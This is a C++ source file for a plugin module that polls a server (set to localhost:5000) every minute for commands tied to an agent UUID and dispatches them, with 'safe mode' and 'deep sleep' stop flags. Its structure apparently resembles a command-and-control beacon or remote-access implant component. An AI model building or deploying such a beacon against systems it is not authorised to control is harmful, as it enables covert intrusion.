#include "CommandHandler.h"
#include "Globals.h"
#include "CommandRegistry.h"
#include <curl/curl.h>
#include <iostream>
#include <chrono>
#include <thread>
#include "json.hpp"

CommandHandler::CommandHandler(const std::string& server) : server_(server) {}

size_t CommandHandler::write_cb(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void CommandHandler::poll() {
    CURL* curl = curl_easy_init();
    if(!curl) return;
    while(!g_safe_mode.load() && !g_deep_sleep.load()) {
        std::string url = server_ + "/commands/" + g_uuid;
        std::string resp;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
        CURLcode res = curl_easy_perform(curl);
        if(res == CURLE_OK && !resp.empty()) {
            try {
                auto json = nlohmann::json::parse(resp);
                for(const auto& cmd : json["commands"]) {
                    if(CommandRegistry::instance().dispatch(cmd)) {
                        if(g_safe_mode.load() || g_deep_sleep.load()) break;
                    }
                }
                if(g_safe_mode.load() || g_deep_sleep.load()) break;
            } catch(const std::exception& e) {
                std::cerr << "Invalid command payload: " << e.what() << std::endl;
            }
        }
        std::this_thread::sleep_for(std::chrono::minutes(1));
    }
    curl_easy_cleanup(curl);
}

void CommandHandler::init() {
    poller_ = std::thread(&CommandHandler::poll, this);
    poller_.detach();
}

extern "C" Module* create_module() { return new CommandHandler("http://localhost:5000"); }
